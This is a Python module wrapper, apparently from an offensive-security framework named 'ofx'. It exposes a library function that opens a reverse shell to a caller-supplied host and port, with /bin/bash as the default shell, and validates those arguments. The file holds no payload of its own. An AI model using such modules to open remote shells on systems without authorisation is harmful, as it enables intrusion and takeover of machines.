"""Module wrapper for ``ofx.lib.network.reverse_shell``."""

from __future__ import annotations

from typing import Any

name = "network.reverse_shell"
description = 'Create a reverse shell that connects to a remote host.'
args_schema: dict[str, Any] = {
        'host': {'type': 'string', 'required': True},
        'port': {'type': 'integer', 'required': True},
        'shell': {'type': 'string', 'default': '/bin/bash'},
}


def run(ctx):
    """Call ofx.lib.network.reverse_shell with the module's arguments."""
    from ofx.lib.network import reverse_shell as _func

    kwargs = {}
    missing = []
    for key, spec in args_schema.items():
        value = ctx.args.get(key, ctx.inputs.get(key))
        if value is not None:
            kwargs[key] = value
        elif spec.get("required"):
            missing.append(key)
    if missing:
        received = ", ".join(sorted(ctx.args)) or "(none)"
        from ofx.modules.libref import LibModuleError

        raise LibModuleError(
            f"Missing required argument(s): {', '.join(missing)}. "
            f"Received keys: {received}"
        )
    result = _func(**kwargs)
    if result is not None:
        if isinstance(result, dict):
            ctx.add_outputs(**result)
        else:
            ctx.add_outputs(result=result)
    return result
